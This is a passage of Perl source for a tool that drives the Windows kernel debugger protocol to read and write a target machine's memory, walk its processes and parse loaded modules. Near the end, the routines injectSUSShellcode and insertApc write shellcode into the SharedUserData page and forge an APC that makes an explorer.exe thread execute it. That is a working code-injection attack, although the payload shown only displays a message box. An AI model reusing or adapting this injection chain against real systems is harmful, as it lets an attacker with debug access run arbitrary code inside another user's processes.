                $out .= substr( $buf, 56 );
            }
            $len = 0;
        }
        else {
            sendDbgKdReadPhysicalMemory( $addr, $chunksize );
            my $buf = waitPacketQuiet(0x313d);
            if ( length($buf) > 56 ) {
                $out .= substr( $buf, 56 );
            }
            $len -= $chunksize;
            $addr += $chunksize;
        }
    }
    return $out;
}

sub writePhysicalMemory {
    my $addr      = shift;
    my $buf       = shift;
    my $len       = length($buf);
    my $chunksize = 0x800;          # max to send in one packet
    my $offset    = 0;
    while ( $len > 0 ) {

        if ( $len < $chunksize ) {
            sendDbgKdWritePhysicalMemory( $addr, $buf );
            waitPacketQuiet(0x313e);
            $len = 0;
        }
        else {
            sendDbgKdWritePhysicalMemory( $addr,
                substr( $buf, $offset, $chunksize ) );
            waitPacketQuiet(0x313e);
            $len -= $chunksize;
            $offset += $chunksize;
            $addr   += $chunksize;
        }
    }
    return;
}

sub writeVirtualMemory {
    my $addr = shift;
    my $buf  = shift;
    my $len  = length($buf);
    return unless $addr && $len;
    my $chunksize = 0x800;    # max to send in one packet
    my $offset    = 0;
    if ( $pcontext->{'pid'} == 0 ) {
        while ( $len > 0 ) {

            if ( $len < $chunksize ) {
                sendDbgKdWriteVirtualMemory( $addr, $buf );
                waitPacketQuiet(0x3131);
                $len = 0;
            }
            else {
                sendDbgKdWriteVirtualMemory( $addr,
                    substr( $buf, $offset, $chunksize ) );
                waitPacketQuiet(0x3131);
                $len -= $chunksize;
                $offset += $chunksize;
                $addr   += $chunksize;
            }
        }
    }
    else {
        my $distance_to_page_boundary = 0x1000 - ( $addr & 0xfff );
        if ( $distance_to_page_boundary > $len ) {
            my $physaddr = logical2physical($addr);
            writePhysicalMemory( $physaddr, $buf );
            return;
        }
        else {
            my $physaddr = logical2physical($addr);
            $buf =
              writePhysicalMemory( $physaddr,
                substr( $buf, 0, $distance_to_page_boundary ) );
            $addr   += $distance_to_page_boundary;
            $offset += $distance_to_page_boundary;
            my $remainder = $len - $distance_to_page_boundary;

            while ( $remainder > 0 ) {
                if ( $remainder < 0x1000 ) {
                    my $physaddr = logical2physical($addr);
                    writePhysicalMemory( $physaddr,
                        substr( $buf, $offset, $remainder ) );
                    $remainder = 0;
                }
                else {
                    my $physaddr = logical2physical($addr);
                    writePhysicalMemory( $physaddr,
                        substr( $buf, $offset, 0x1000 ) );
                    $addr   += 0x1000;
                    $offset += 0x1000;
                    $remainder -= 0x1000;
                }
            }
            return;
        }

    }
}

sub readVirtualMemory {
    my $addr = shift;
    my $len  = shift;
    return unless $addr && $len;
    my $chunksize = 0x800;    # max to request in one packet
    my $out;
    my $buf;
    if ( $pcontext->{'pid'} == 0 ) {
        while ( $len > 0 ) {

            if ( $len < $chunksize ) {
                sendDbgKdReadVirtualMemory( $addr, $len );
                $buf = waitPacketQuiet(0x3130);
                if ( length($buf) > 56 ) {
                    $out .= substr( $buf, 56 );
                }
                $len = 0;
            }
            else {
                sendDbgKdReadVirtualMemory( $addr, $chunksize );
                $buf = waitPacketQuiet(0x3130);
                if ( length($buf) > 56 ) {
                    $out .= substr( $buf, 56 );
                }
                $len -= $chunksize;
                $addr += $chunksize;
            }
        }
        return $out;
    }
    else {
        my $distance_to_page_boundary = 0x1000 - ( $addr & 0xfff );
        if ( $distance_to_page_boundary > $len ) {
            my $physaddr = logical2physical($addr);
            return readPhysicalMemory( $physaddr, $len );
        }
        else {
            my $physaddr = logical2physical($addr);
            $buf = readPhysicalMemory( $physaddr, $distance_to_page_boundary );
            $addr += $distance_to_page_boundary;
            my $remainder = $len - $distance_to_page_boundary;
            while ( $remainder > 0 ) {
                if ( $remainder < 0x1000 ) {
                    my $physaddr = logical2physical($addr);
                    $buf .= readPhysicalMemory( $physaddr, $remainder );
                    $remainder = 0;
                }
                else {
                    my $physaddr = logical2physical($addr);
                    $buf .= readPhysicalMemory( $physaddr, 0x1000 );
                    $addr += 0x1000;
                    $remainder -= 0x1000;
                }
            }
            return $buf;
        }

    }
}

sub sendDbgKdReboot {
    print "Sending DbgKdRebootApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0, 4 ) = pack( "I", 0x313b );
    sendManipulateStatePacket($d);
}

sub waitPacket {
    return if $running;
    my $wanted = shift;
    my $buf;
    alarm($timeout);
    eval {
        while ( unpack( "I", substr( $buf, 0, 4 ) ) != $wanted )
        {
            $buf = getPacket(1);
            decodePayload($buf);
        }
    };
    alarm(0);
    if ($@) {
        if ( $@ !~ /timeout/ ) {
            die "Fatal: $@\n";
        }
        else {
            printf "Timeout waiting for %04x packet reply\n", $wanted;
        }
    }
    return $buf;
}

sub waitPacketQuiet {
    return if $running;
    my $wanted = shift;
    my $buf;
    alarm($timeout);
    eval {
        while ( unpack( "I", substr( $buf, 0, 4 ) ) != $wanted )
        {
            $buf = getPacket(1);
            decodePayload( $buf, 1 );
        }
    };
    alarm(0);
    if ($@) {
        if ( $@ !~ /timeout/ ) {
            die "Fatal: $@\n";
        }
        else {
            printf "Timeout waiting for %04x packet reply\n", $wanted;
        }
    }
    return $buf;
}

sub getPspCidTable {
    my $pspcidtable = 0;
    my $save        = $pcontext;
    $pcontext = \%kernelcontext;    # this procedure is kernel context only
    sendDbgKdGetVersion();
    my $buf = waitPacketQuiet(0x3146);
    my $pddata = unpack( "I", substr( $buf, 48, 4 ) );
    if ($pddata) {

        #printf "Pointer to debugger data struct is at %08x\n", $pddata;
        my $ddata = readDword($pddata);
        if ( $ddata ne "failed" ) {

            #printf "debugger data struct is at %08x\n", $ddata;
            $pspcidtable = readDword( $ddata + 88 );
            if ( $pspcidtable ne "failed" ) {

                #printf "PspCidTable is %08x\n", $pspcidtable;
                $pcontext = $save;
                return $pspcidtable;
            }
        }
    }
    $pcontext = $save;
    return 0;
}

sub getEprocess {
    my $pid  = shift;
    my $j    = ( $pid >> 18 ) & 0xff;
    my $k    = ( $pid >> 10 ) & 0xff;
    my $l    = ( $pid >> 2 ) & 0xff;
    my $save = $pcontext;
    $pcontext = \%kernelcontext;    # this procedure is kernel context only
                                    #print "Finding eprocess[$j][$k][$l]\n";
    my $pspcidtable = getPspCidTable();

    if ($pspcidtable) {
        my $subtable;
        if ( $version >= 6.0 ) {
            $subtable = readDword($pspcidtable);
        }
        else {
            my $table;
            my $ptable = readDword($pspcidtable);
            if ( $ptable ne "failed" ) {

                #printf "ptable: %08x\n", $ptable;
                $table = readDword( $ptable + 8 );
            }
            if ( $table ne "failed" ) {

                #printf "table: %08x\n", $table;
                $subtable = readDword( $table + ( $j * 4 ) );
            }
        }
        if ( ($subtable) && ( $subtable ne "failed" ) ) {

            #printf "subtable: %08x\n", $subtable;
            my $subsubtable = readDword( $subtable + ( $k * 4 ) );
            if ( $subsubtable ne "failed" ) {

                #printf "subsubtable: %08x\n", $subsubtable;
                my $entry = readDword( $subsubtable + ( $l * 8 ) );
                if ( $entry ne "failed" ) {
                    if ( $version < 6 ) {
                        $entry |= 0x80000000;    # lock bit
                    }
                    else {
                        $entry &= 0xfffffffe;    # lock bit
                    }

                  #printf "eprocess of pid 0x%x starts at %08x\n", $pid, $entry;
                    $pcontext = $save;
                    return $entry;
                }
            }
        }
    }
    $pcontext = $save;
    return 0;
}

sub getProcessList {
    my $ep;
    my %prochash;
    my ( $listoffset, $pidoffset, $nameoffset, $timeoffset );
    my ( $threadoffset, $peboffset, $dtboffset );
    my $save = $pcontext;
    $pcontext = \%kernelcontext;    # this procedure is kernel context only
    if ( $version >= 6.0 ) {

        # xp, vista
        $ep           = getEprocess(4);
        $listoffset   = 0x88;
        $pidoffset    = 0x84;
        $nameoffset   = 0x174;
        $timeoffset   = 0x70;
        $threadoffset = 0x1b0;
        $peboffset    = 0x1b0;
        $dtboffset    = 0x18;
    }
    else {

        # win2k
        $ep           = getEprocess(8);
        $listoffset   = 0xa0;
        $pidoffset    = 0x9c;
        $nameoffset   = 0x1fc;
        $timeoffset   = 0x88;
        $threadoffset = 0x1a4;
        $peboffset    = 0x1b0;
        $dtboffset    = 0x18;
    }

    #printf "System ep: %08x\n", $ep;
    unless ($ep) { $pcontext = $save; return }
    my @procs = walkList( $ep + $listoffset, $listoffset );
    for my $eproc (@procs) {
        my $e = readVirtualMemory( $eproc, 0x21c );
        if ( length($e) == 0x21c ) {

            #print hexformat($e);
            my $name = substr( $e, $nameoffset, 16 );
            $name =~ s/\x00//g;
            my $pid = unpack( "I", substr( $e, $pidoffset, 4 ) );
            next unless ($pid) && ( $pid < 0xffff );
            my $dtb = unpack( "I", substr( $e, $dtboffset, 4 ) );
            my $peb = unpack( "I", substr( $e, $peboffset, 4 ) );
            my $created = ft2Time( substr( $e, $timeoffset, 8 ) );

            my @threads =
              walkList( unpack( "I", substr( $e, 0x50, 4 ) ), $threadoffset );
            if (@threads) {
                $prochash{$eproc}{'pid'}     = $pid;
                $prochash{$eproc}{'name'}    = $name;
                $prochash{$eproc}{'created'} = $created;
                $prochash{$eproc}{'dtb'}     = $dtb;
                $prochash{$eproc}{'peb'}     = $peb;
                @{ $prochash{$eproc}{'threads'} } = @threads;
            }
        }
    }
    $pcontext = $save;
    return %prochash;
}

sub ft2Time {
    my $ft = shift;
    return 0 unless length($ft) == 8;
    my $ch = 0x019db1de;
    my $cl = 0xd53e8000;
    my $lo = unpack( "I", substr( $ft, 0, 4 ) );
    my $hi = unpack( "I", substr( $ft, 4, 4 ) );
    return 0 if ( $hi < $ch ) || ( ( $hi == $ch ) && ( $lo < $cl ) );
    return ( ( ( ( $hi * 0x10000 ) * 0x10000 ) + $lo ) -
          ( ( ( $ch * 0x10000 ) * 0x10000 ) + $cl ) ) / 10000000;
}

sub walkList {
    my @ret;
    my $flink  = shift;    # address of LIST_ENTRY in struct
    my $offset = shift;    # offset to LIST_ENTRY from beginning of struct
    my $top    = $flink;
    while ( $flink != 0 ) {
        push( @ret, $flink - $offset );
        $flink = readDword($flink);
        last if ( $flink == $top ) || ( $flink eq "failed" );
    }
    return @ret;
}

sub injectSUSShellcode {
    my $title     = shift;
    my $message   = shift;
    my $userbase  = 0x7ffe0800;
    my $ring0base = 0xffdf0800;
    my $save      = $pcontext;
    $pcontext = \%kernelcontext;    # this procedure is kernel context only
    my $messageboxa = getProcAddress( "user32.dll", "MessageBoxA" );

    my $sc =
        "\x6a\x00\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00"
      . "\x6A\x00\xE8\x00\x00\x00\x00\xc3$title\x00$message\x00";
    substr( $sc, 3,  4 ) = pack( "I", $userbase + 20 );
    substr( $sc, 8,  4 ) = pack( "I", $userbase + 21 + length($title) );
    substr( $sc, 15, 4 ) = pack( "I", $messageboxa - ( $userbase + 19 ) );

    writeVirtualMemory( $ring0base, $sc );
    printf "Shellcode injected at %08x (%08x)\n", $ring0base, $userbase;
    $pcontext = $save;
}

sub insertApc {
    print "Searching for thread in explorer.exe\n";
    my %procs = getProcessList();
    my $thread;
    for ( sort keys %procs ) {
        my $n = lc( $procs{$_}{'name'} );
        print "Found $n\n";
        if ( $n eq "explorer.exe" ) {

            #printf "Found explorer.exe\n";
            $thread = shift( @{ $procs{$_}{'threads'} } );
            last;
        }
    }
    unless ($thread) {
        print "Failed to find thread\n";
        return;
    }
    printf "Using thread object at %08x\n", $thread;
    my $kernelret = findRet();
    my $shellcode = 0x7ffe0800;
    my $apc       = "\x00" x 48;
    my $putme     = 0xffdf0900;
    my $save      = $pcontext;
    $pcontext = \%kernelcontext;    # this procedure is kernel context only
    substr( $apc, 0,  2 ) = pack( "S", 0x12 );       # type = Apc object
    substr( $apc, 2,  2 ) = pack( "S", 0x30 );       # size of object = 48 bytes
    substr( $apc, 8,  4 ) = pack( "I", $thread );    # ethread ptr
    substr( $apc, 20, 4 ) = pack( "I", $kernelret ); # ret command in kernel
    substr( $apc, 28, 4 ) = pack( "I", $shellcode ); # shellcode vaddr
    substr( $apc, 36, 4 ) = pack( "I", $putme + 0x50 );    # system arg 1
    substr( $apc, 40, 4 ) = pack( "I", $putme + 0x54 );    # system arg 2
    substr( $apc, 46, 1 ) = "\x01";    # Apc mode = user mode
    substr( $apc, 47, 1 ) = "\x01";    # Inserted = true (well, it will be)

    printf "Built APC object for thread at %08x\n", $thread;

    #print hexformat($apc);
    printf "Inserting into APC list at %08x\n", $thread + 0x3c;
    my $oldflink = readDword( $thread + 0x3c );
    printf "Replacing old Apc flink: %08x\n", $oldflink;
    if ( $oldflink ne "failed" ) {
        substr( $apc, 12, 4 ) = pack( "I", $oldflink );         # flink
        substr( $apc, 16, 4 ) = pack( "I", $thread + 0x3c );    # blink

        # write APC object to SharedUserSpace
        writeVirtualMemory( $putme, $apc );

        # insert our APC into the list
        writeVirtualMemory( $thread + 0x3c, pack( "I", $putme + 12 ) );

        # set UserApcPending = TRUE
        writeVirtualMemory( $thread + 0x4a, "\x01" );
        printf "Inserted APC into thread at %08x\n", $thread;
    }
    else {
        print "Failed to insert APC\n";
    }
    $pcontext = $save;
}

sub parsePE {

    # Some PE parsing code borrowed from Metasploit PE module
    my %pe_hdr;
    my $crap;
    my $base = shift;
    my $data = readVirtualMemory( $base, 0x800 );
    $data .= readVirtualMemory( $base + 0x800, 0x800 );

    #printf "Read %d bytes of PE header at %08x\n", length($data),$base;
    return unless length($data) == 0x1000;

    return unless substr( $data, 0, 2 ) eq "MZ";
    my $peo = unpack( "I", substr( $data, 0x3c, 4 ) );
    return unless substr( $data, $peo, 2 ) eq "PE";

    $pe_hdr{"MachineID"}            = unpack( "S", substr( $data, $peo + 4 ) );
    $pe_hdr{"NumberOfSections"}     = unpack( "S", substr( $data, $peo + 6 ) );
    $pe_hdr{"TimeDateStamp"}        = unpack( "L", substr( $data, $peo + 8 ) );
    $pe_hdr{"PointerToSymbolTable"} = unpack( "L", substr( $data, $peo + 12 ) );
    $pe_hdr{"NumberOfSymbols"}      = unpack( "L", substr( $data, $peo + 16 ) );
    $pe_hdr{"SizeOfOptionalHeader"} = unpack( "S", substr( $data, $peo + 20 ) );
    $pe_hdr{"Characteristics"}      = unpack( "S", substr( $data, $peo + 22 ) );

    if ( $pe_hdr{"SizeOfOptionalHeader"} < 224 ) {
        return 0;
    }
    my $opthdr = substr( $data, $peo + 24, $pe_hdr{"SizeOfOptionalHeader"} );
    $pe_hdr{"Magic "}              = unpack( "S", substr( $opthdr, 0 ) );
    $pe_hdr{"MajorLinker"}         = unpack( "C", substr( $opthdr, 2 ) );
    $pe_hdr{"MinorLinker"}         = unpack( "C", substr( $opthdr, 3 ) );
    $pe_hdr{"SizeOfCode"}          = unpack( "L", substr( $opthdr, 4 ) );
    $pe_hdr{"SizeOfInitialized"}   = unpack( "L", substr( $opthdr, 8 ) );
    $pe_hdr{"SizeOfUninitialized"} = unpack( "L", substr( $opthdr, 12 ) );

    $pe_hdr{"EntryPoint"} = unpack( "L", substr( $opthdr, 16 ) );
    $pe_hdr{"BaseOfCode"} = unpack( "L", substr( $opthdr, 20 ) );
    $pe_hdr{"BaseOfData"} = unpack( "L", substr( $opthdr, 24 ) );

    $pe_hdr{"ImageBase"}    = unpack( "L", substr( $opthdr, 28 ) );
    $pe_hdr{"SectionAlign"} = unpack( "L", substr( $opthdr, 32 ) );
    $pe_hdr{"FileAlign"}    = unpack( "L", substr( $opthdr, 36 ) );

    $pe_hdr{"MajorOS"}    = unpack( "S", substr( $opthdr, 38 ) );
    $pe_hdr{"MinorOS"}    = unpack( "S", substr( $opthdr, 40 ) );
    $pe_hdr{"MajorImage"} = unpack( "S", substr( $opthdr, 42 ) );
    $pe_hdr{"MinorImage"} = unpack( "S", substr( $opthdr, 44 ) );
    $pe_hdr{"MajorSub"}   = unpack( "S", substr( $opthdr, 46 ) );
    $pe_hdr{"MinorSub"}   = unpack( "S", substr( $opthdr, 48 ) );

    $pe_hdr{"Reserved"}            = unpack( "L", substr( $opthdr, 52 ) );
    $pe_hdr{"SizeOfImage"}         = unpack( "L", substr( $opthdr, 56 ) );
    $pe_hdr{"SizeOfHeaders"}       = unpack( "L", substr( $opthdr, 60 ) );
    $pe_hdr{"Checksum"}            = unpack( "L", substr( $opthdr, 64 ) );
    $pe_hdr{"Subsystem"}           = unpack( "S", substr( $opthdr, 68 ) );
    $pe_hdr{"DllCharacteristics"}  = unpack( "S", substr( $opthdr, 70 ) );
    $pe_hdr{"SizeOfStackReserve"}  = unpack( "L", substr( $opthdr, 72 ) );
    $pe_hdr{"SizeOfStackCommit"}   = unpack( "L", substr( $opthdr, 76 ) );
    $pe_hdr{"SizeOfHeapReserve"}   = unpack( "L", substr( $opthdr, 80 ) );
    $pe_hdr{"SizeOfHeapCommit"}    = unpack( "L", substr( $opthdr, 84 ) );
    $pe_hdr{"LoaderFlags"}         = unpack( "L", substr( $opthdr, 88 ) );
    $pe_hdr{"NumberOfRvaAndSizes"} = unpack( "L", substr( $opthdr, 92 ) );

    my @RVAMAP = qw(export import resource exception certificate basereloc
      debug archspec globalptr tls load_config boundimport importaddress
      delayimport comruntime none);

    # parse the rva data
    my $rva_data = substr( $opthdr, 96, $pe_hdr{"NumberOfRvaAndSizes"} * 8 );
    my %RVA;
    for ( my $x = 0 ; $x < $pe_hdr{"NumberOfRvaAndSizes"} ; $x++ ) {
        if ( !$RVAMAP[$x] ) { $RVAMAP[$x] = "unknown_$x" }
        $RVA{ $RVAMAP[$x] } = [
            unpack( "L", substr( $rva_data, ( $x * 8 ) ) ),
            unpack( "L", substr( $rva_data, ( $x * 8 ) + 4 ) ),
        ];
    }

    # parse the section headers
    my $sec_begn = $peo + 24 + $pe_hdr{"SizeOfOptionalHeader"};
    my $sec_data = substr( $data, $sec_begn );

    for ( my $x = 0 ; $x < $pe_hdr{"NumberOfSections"} ; $x++ ) {
        my $sec_head = $sec_begn + ( $x * 40 );
        my $sec_name = substr( $data, $sec_head, 8 );
        $sec_name =~ s/\x00//g;
        if ( $sec_name eq "" ) { $sec_name = ".sec$x" }

        #my $sec_name = ".sec$x";
        my $vsize   = unpack( "L", substr( $data, $sec_head + 8 ) );
        my $voffset = unpack( "L", substr( $data, $sec_head + 12 ) );
        my $rsize   = unpack( "L", substr( $data, $sec_head + 16 ) );
        my $roffset = unpack( "L", substr( $data, $sec_head + 20 ) );
        my $type;
        if    ( $voffset == $pe_hdr{"BaseOfCode"} ) { $type = "CODE" }
        elsif ( $voffset == $pe_hdr{"BaseOfData"} ) { $type = "DATA" }
        else                                        { $type = "UNKNOWN" }
    }
    $pe_hdr{'import'}     = $RVA{'import'}->[0];
    $pe_hdr{'export'}     = $RVA{'export'}->[0];
    $pe_hdr{'importsize'} = $RVA{'import'}->[1];
    $pe_hdr{'exportsize'} = $RVA{'export'}->[1];
    return %pe_hdr;
}

sub getImports {
    my $base    = shift;    # base address of module
    my $ioffset = shift;    # offset to import table
    my $size    = shift;    # size of import table
    my $crap;

    my $imports = readVirtualMemory( $base + $ioffset, $size );

    for ( my $i = 0 ; $i < $size ; $i += 20 ) {
        last if substr( $imports, $i, 20 ) eq "\x00" x 20;
        my $rvaILT         = unpack( "L", substr( $imports, $i,      4 ) );
        my $timestamp      = unpack( "L", substr( $imports, $i + 4,  4 ) );
        my $forwarderchain = unpack( "L", substr( $imports, $i + 8,  4 ) );
        my $rvaModuleName  = unpack( "L", substr( $imports, $i + 12, 4 ) );
        my $rvaIAT         = unpack( "L", substr( $imports, $i + 16, 4 ) );
        my $modname = readVirtualMemory( $base + $rvaModuleName );
        $modname =~ s/\x00.*//;

        if ($rvaILT) {
            my $count = 0;
            my $ibuf = readVirtualMemory( $base + $rvaILT, 4 );
          IGRAB: while ( $ibuf ne "\x00\x00\x00\x00" ) {
                my $importthunkRVA = unpack( "L", $ibuf );
                last IGRAB if $importthunkRVA == 0;

                if ( $importthunkRVA & 0x8000000 ) {
                    printf "ORD: 0x%x\n", $importthunkRVA & ~0x80000000;
                }
                else {
                    my $importname =
                      readVirtualMemory( $importthunkRVA & ~0x80000000, 255 );
                    $importname = substr( $importname, 2 );
                    ( $importname, $crap ) = split( /\x00/, $importname );
                    my $thunk = $base + $rvaIAT + ( $count * 4 );
                    my ( $mod, $suff ) = split( /\./, lc($modname) );
                    printf "%s (0x%x)\n", $importname, $thunk;
                }
                $count++;
                $ibuf =
                  readVirtualMemory( $base + ( $rvaILT + $count * 4 ), 4 );
            }    # end while
        }    # end if rvaILT
        else {
            my $count = 0;
            my $ibuf = readVirtualMemory( $base + $rvaIAT, 4 );
          IGRAB: while ( $ibuf ne "\x00\x00\x00\x00" ) {
                my $importthunkRVA = unpack( "L", $ibuf );
                last IGRAB if $importthunkRVA == 0;
                my $importname =
                  readVirtualMemory( $base + $importthunkRVA, 255 );
                $importname = substr( $importname, 2 );
                ( $importname, $crap ) = split( /\x00/, $importname );
                my $thunk = $base + $rvaIAT + ( $count * 4 );
                my ( $mod, $suff ) = split( /\./, lc($modname) );
                printf "%s (0x%x)\n", $importname, $thunk;

                $count++;
                $ibuf = readVirtualMemory( $base + $rvaIAT, 4 );
            }    # end while
        }    # end if rvaILT
    }    # end if import module
}

sub locateExportNameInTable {
    my $procname = shift;
    my $base     = shift;
    my $eoffset  = shift;
    my $size     = shift;
    my %exp      = getExports( $base, $eoffset, $size );
    for ( keys %exp ) {
        if ( $exp{$_} eq $procname ) {
            return $_;
        }
    }
}

sub getExports {
    my $base    = shift;
    my $eoffset = shift;
    my $size    = shift;
    my %exportlist;

    return unless $base && $eoffset && $size;
    my $exports = readVirtualMemory( $base + $eoffset, $size );

    my $ebase     = unpack( "I", substr( $exports, 16, 4 ) );
    my $enumfuncs = unpack( "I", substr( $exports, 20, 4 ) );
    my $enumnames = unpack( "I", substr( $exports, 24, 4 ) );
    my $EATrva    = unpack( "I", substr( $exports, 28, 4 ) );
    my $ENTrva    = unpack( "I", substr( $exports, 32, 4 ) );
    my $EOTrva    = unpack( "I", substr( $exports, 36, 4 ) );
    my ( @exportnames, @exportordinals, @exportfunctions );

    # get ascii name table boundaries
    my $nbegin   = readDword( $base + $ENTrva );
    my $nend     = readDword( $base + $ENTrva + ( ( $enumnames - 1 ) * 4 ) );
    my $lastname = readVirtualMemory( $nend + $base, 255 );
    my $term     = index( $lastname, "\x00" );
    $nend += $term;
    my $namebuf = readVirtualMemory( $nbegin + $base, $nend - $nbegin );

    #print hexasc($namebuf);

    my $nametable = readVirtualMemory( $ENTrva + $base, $enumnames * 4 );
    my $functable = readVirtualMemory( $EATrva + $base, $enumfuncs * 4 );
    my $ordtable  = readVirtualMemory( $EOTrva + $base, $enumfuncs * 2 );

    for ( 0 .. $enumnames - 1 ) {
        my $n = unpack( "L", substr( $nametable, $_ * 4, 4 ) );
        if ( $n >= $nbegin ) {
            my $ename = substr( $namebuf, $n - $nbegin, 255 );
            $ename =~ s/\x00.*//g;
            push( @exportnames, $ename );

            #printf "Adding name index %d (begins at %08x: raw %08x) %s\n",
            #$_, $n, $n-$nbegin, $ename;
        }
    }
    for ( 0 .. $enumfuncs - 1 ) {
        my $eord = unpack( "S", substr( $ordtable, $_ * 2, 2 ) );
        push( @exportordinals, $eord );
    }
    for ( 0 .. $enumfuncs - 1 ) {
        my $eaddr = unpack( "L", substr( $functable, $_ * 4, 4 ) );
        push( @exportfunctions, $eaddr );
    }

    for my $o ( 0 .. $#exportnames ) {
        my $name = $exportnames[$o];
        my $ord  = $exportordinals[$o];
        my $addr = $exportfunctions[$ord];
        $name ||= $ord;
        $exportlist{ $addr + $base } = $name;
    }
    return %exportlist;
}

sub findRet {
    my $hp;
    my $pos;
    my $save = $pcontext;
    $pcontext = \%kernelcontext;    # this procedure is kernel context only
    for ( 0 .. 100 ) {
        $hp = $_;
        my $buf =
          readVirtualMemory( $kernelbase + 0x1000 + ( $hp * 0x800 ), 0x800 );
        $pos = index( $buf, "\xc3" );
        last unless $pos == -1;
    }
    my $ret = $kernelbase + 0x1000 + ( $hp * 0x800 ) + $pos;
    printf "Found RETN instruction at %08x", $ret;
    $pcontext = $save;
    return $ret;
}

sub logical2physical {
    my $logical = shift;                # a virtual address in a process
    my $pdb     = $pcontext->{'dtb'};
    return unless $pdb;
    my $offset = $logical & 0xfff;                            # save byte offset
    my $pde    = ( $logical >> 22 ) & 0x3ff;
    my $pte    = ( $logical >> 12 ) & 0x3ff;
    my $buf    = readPhysicalMemory( $pdb + ( $pde * 4 ), 4 );
    my $valid  = unpack( "I", $buf ) & 0x1;
    if ($valid) {
        my $ptb = unpack( "I", $buf ) & 0xfffff000;

#printf "Seeking to PTB %08x + PTE %03x * 4 = %08x\n", $ptb, $pte, $ptb + ($pte * 4);
        $buf = readPhysicalMemory( $ptb + ( $pte * 4 ), 4 );
        $valid = unpack( "I", $buf ) & 0x1;
        if ($valid) {
            my $phys = unpack( "I", $buf ) & 0xfffff000;
            return ( $phys | $offset );    #restore byte offset
        }
    }
    printf "Invalid PTE found for va %08x: %08x\n", $logical,
      unpack( "I", $buf );
    return 0;
}

sub listExports {
    my $base = shift;
    my %pe   = parsePE($base);
    if ( $pe{'export'} && $pe{'exportsize'} ) {
        printf "Exports found in PE file at %08x:\n", $base;
        my %exp = getExports( $base, $pe{'export'}, $pe{'exportsize'} );
        for ( sort keys %exp ) {
            printf "%08x:%s\n", $_, $exp{$_};
        }
    }
    else {
        print "No export table found\n";
    }
}

sub getProcAddress {
    my $module   = shift;
    my $procname = shift;
    my $save     = $pcontext;
    my $addr;

    # get eprocess list, start with bottom process
    my %procs = getProcessList();
    for ( sort keys %procs ) {
        my $dtb      = $procs{$_}{'dtb'};
        my $peb      = $procs{$_}{'peb'};
        my $pid      = $procs{$_}{'pid'};
        my $eprocess = $_;
        next unless $peb;
        printf "Searching for %s in modules of pid %x (eprocess is %08x)\n",
          $procname, $pid, $eprocess;

        # set process context
        $processcontext{'dtb'}      = $dtb;
        $processcontext{'pid'}      = $pid;
        $processcontext{'peb'}      = $peb;
        $processcontext{'eprocess'} = $eprocess;

        $pcontext = \%processcontext;

        my %modules = getUserModules();
        for ( sort keys %modules ) {
            if (   ( $modules{$_}{'name'} =~ /^$module$/i )
                || ( $modules{$_}{'name'} =~ /^$module\.dll/i ) )
            {
                printf "Found instance of %s at %08x\n", $module, $_;
                my %pe = parsePE($_);
                $addr =
                  locateExportNameInTable( $procname, $_, $pe{'export'},
                    $pe{'exportsize'} );
                goto DONEGOTPROC;
            }
        }
    }
  DONEGOTPROC:

    # back to original process context
    $pcontext = $save;
    return $addr;
}

sub getUserModules {
    my %modules;

    # read PEB into buf
    my $peb = $pcontext->{'peb'};
    my $pebdata = readVirtualMemory( $peb, 0x300 );
    next unless length($pebdata) == 0x300;

    # get module list
    my $mptr = unpack( "I", substr( $pebdata, 0x0c, 4 ) );
    my $modulelist = readDword( $mptr + 0x14, 4 );
    my @modlist = walkList($modulelist);
    for my $mod (@modlist) {
        my $buf = readVirtualMemory( $mod, 0x34 );
        if ( length($buf) == 0x34 ) {
            my $base = unpack( "I", substr( $buf, 0x10, 4 ) );
            next if $base == 0;
            my $entry = unpack( "I", substr( $buf, 0x14, 4 ) );
            my $size = unpack( "I", substr( $buf, 0x18, 4 ) );
            my $path = substr( $buf, 0x1c, 8 );
            my $name = substr( $buf, 0x24, 8 );
            $modules{$base}{'name'}  = unicodeStructToAscii($name);
            $modules{$base}{'path'}  = unicodeStructToAscii($path);
            $modules{$base}{'size'}  = $size;
            $modules{$base}{'entry'} = $entry;
        }
    }
    return %modules;
}
